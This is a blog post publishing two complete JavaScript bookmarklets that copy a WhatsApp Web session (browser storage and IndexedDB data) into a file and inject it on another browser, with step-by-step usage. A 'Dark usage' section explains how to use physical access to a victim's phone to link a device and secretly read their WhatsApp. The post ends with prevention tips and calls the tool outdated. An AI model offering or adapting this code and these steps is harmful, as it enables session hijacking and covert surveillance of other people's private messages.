---
layout: post
title: "WhatsApp Web Session Dumper"
author: Flareonz44
tags: [cybersec]
type: project
metadesc: An [outdated] whatsapp web hijack that cones the session into a file
---

***All content shown in this post is exclusively for educational purposes. I'm not responsible for the use you make of the information shown here.***

The code is also on my [GitHub](https://github.com/Flareonz44/WhatsApp-Web-Session-Dumper)!

# IMPORTANT NOTICE (08/09/2022)

This tool has been deprecated due to changes in the WhatsApp Web application. The method previously used by this tool no longer works with WhatsApp Web, but it may still be effective on other platforms. Nonetheless, I'll keep this page here for future generations :)

## About

Well, this is what its name suggests: It's a dumper that extracts all the WhatsApp Web data stored on your computer into a file. You can then inject this data into another computer, granting access to the web session without the need to scan the QR code again. This repository consists of two files: `wawebb_session_dumper.js` and `wawebb_session_injector.js`. These two files are independent and can be run separately without affecting the results. Let's take a closer look at what they do.

### wawebb_session_dumper.js

This script iterates over all the data stored on your localStorage, arranges it and creates a file that is automatic downloaded, after you provide a name fot the file.

```javascript
function save(data) {
    var doc = document.createElement("a");
    doc.href = window.URL.createObjectURL(new Blob([data], {
        type: "text/plain"
    }));
    filen = prompt("Input session name", "saved-session") + ".was";
    if (!(filen == "null.was")) {
        doc.download = filen;
        doc.click();
        alert("\nFile successfuly saved as " + filen + "\n\nCreated by Flareonz44");
    }
}
if ((document.title).indexOf("WhatsApp") >= 0) {
    naou = "";
    for (i = 0; i < localStorage.length; i++) {
        keyn = localStorage.key(i);
        datag = localStorage.getItem(localStorage.key(i));
        if (!(i == 0)) {
            naou += "\n";
        }
        naou += keyn + ":::" + datag;
    }
    naou += "\n>>\n";
    for (i = 0; i < sessionStorage.length; i++) {
        keyn = sessionStorage.key(i);
        datag = sessionStorage.getItem(sessionStorage.key(i));
        if (!(i == 0)) {
            naou += "\n";
        }
        naou += keyn + ":::" + datag;
    }
    naou += "\n>>\n";
    idb = indexedDB.open("wawc");
    idb.onsuccess = function() {
        dbm = idb.result;
        d1 = dbm.transaction("user", "readwrite").objectStore("user").getAll();
        d1.onsuccess = function() {
            naou += JSON.stringify(d1.result) + "\n";
            save(naou);
        }
    }
} else {
    alert("\nERROR\nRun script inside WhatsApp's tab!");
}

```

### wawebb_session_injector.js

This scripts does the inverse process of the script above, it asks for the data (created with the last script) of the file, and then it restores all the saved data back to localStorege, then it reloads the page.

```javascript
if ((document.title).indexOf("WhatsApp") >= 0) {
    sesf = prompt("Paste raw data from .was files");
    if (sesf.indexOf(">>") >= 0) {
        sesfarr = sesf.split(">>");
        for (i = 0; i < sesfarr.length; i++) {
            if (i == 0) {
                localStorage.clear();
                keyl = sesfarr[0].split("\n");
                for (j = 0; j < keyl.length; j++) {
                    if (keyl[j].indexOf(":::") >= 0) {
                        key = keyl[j].split(":::")[0];
                        val = keyl[j].split(":::")[1];
                        localStorage.setItem(key, val);
                    }
                }
            } else if (i == 1) {
                sessionStorage.clear();
                keyl = sesfarr[0].split("\n");
                for (j = 0; j < keyl.length; j++) {
                    if (keyl[j].indexOf(":::") >= 0) {
                        let key = keyl[j].split(":::")[0];
                        let val = keyl[j].split(":::")[1];
                        sessionStorage.setItem(key, val);
                    }
                }
            } else if (i == 2) {
                sesfarr[2] = sesfarr[2].replace(/(\n)/g, "");
                let idb = indexedDB.open("wawc");
                idb.onsuccess = function() {
                    let dbm = idb.result;
                    let d1 = dbm.transaction("user", "readwrite").objectStore("user").clear();
                    d1.onsuccess = function() {
                        let d2 = dbm.transaction("user", "readwrite").objectStore("user").put(JSON.parse(sesfarr[2]));
                    }
                }
            }
        }
        alert("\nData successfuly loaded!" + "\n\n       Created by Flareonz44");
        location.reload();
    } else {
        alert("\nERROR\nA valid raw data must be pasted!");
    }
} else {
    alert("\nERROR\nRun Script inside WhatsApp's tab!");
}
```

## Usage

This is very easy to use. First you have to create two bookmarks on Chrome: one for the dumper and the other for the injector. Select all the code above, copy it, and then, create a new bookmark. In the name write wawebb_session_dumper.js and where sais 'URL', delete all and write 'javascript: ' (without quotes and with a space between the ':' and the code, like 'javascript: functi...' rather than 'javascript:functi...') and then, paste the copied code next tho the ': ', like so:

![bookmark how to](/images/2022-8-9-ws-web-session-dumper/1.png)

Then do the same for the other script and save those bookmarks into the same folder. Now go to WhatsApp Web and scan the QR as always. Wait until it is completely loaded and when you are ready, go to your bookmark folder and click on wawebb_session_dumper.js. A prompt will apear asking for for a name for the session, just provide the name you like and click on ok. A file will be downloaded. Thats the session file.

Now, copy that file into an USB stick, or save it on the cloud (or wherever you want) and go to another computer. Open the session file with the notepad and select all the text and copy it to the clipboard. Go to WhatsApp Web on Chrome and launch the bookmark wawebb_session_injector.js. A promp will apear asking you to provide the content of the session file. Just Ctrl + V or right-click-then-paste on the textbox the content of the clipboard and hit ok. Finally realod the page and thats all! you must be logged with the web session like in the first computer.

## Notes

This script was also tested on Android 10 Chrome Browser, so you can dump and inject on Android too! Anyway, I'm afraid that there is not a 100% compatibility, so it may work on the most of the latest devices, but it could fail to execute on older devices. This script was tested on Chrome Browser version 97. Not tested on other browsers.

## Dark usage

As a cyber-security entusiast, I must say that this tool could be used to gain access to someone's WhatsApp. You only need to know the victim's phone password (or PIN) and have phisical access to his phone for at least 1 minute with Internet connection.

Open Chrome Browser on your phone, search for 'whatsapp web' and, on the Google's results page, put your browser in Desktop Mode, then reload the result page and go to Whatsapp Web. Put your phone in landscape mode (rotate it) and wait untill you see the QR code. When it is loaded, grab the victim's phone, go to his WhatsApp and add a new Conected Device, then scan the QR on your phone and when it's done, launch the wawebb_session_dumper.js bookmark (previously created on your Chrome Browser) and then provide a name for the session file.

The next step is to copy the session file to your personal computer and injet it on your browser. Now you can see the victim's WhatsApp.

## Prevention

Here you have some tips for protecting yourself from this kind of attack:
- Always check what Connected Devices you have, and close the ones that seems suspicious.
- Change you phone PIN regularly.
- Prefere text-based password for your phone, rather than a Pattern (which is more easy to remember and hack) and/or
- biometric-based.
- Add a second password to open WhatsApp (you can use an app like Norton App Lock)
- Add the second fingerprint authentication on WhatsApp (only availiable on latest releases and on some devices only)

Till next time!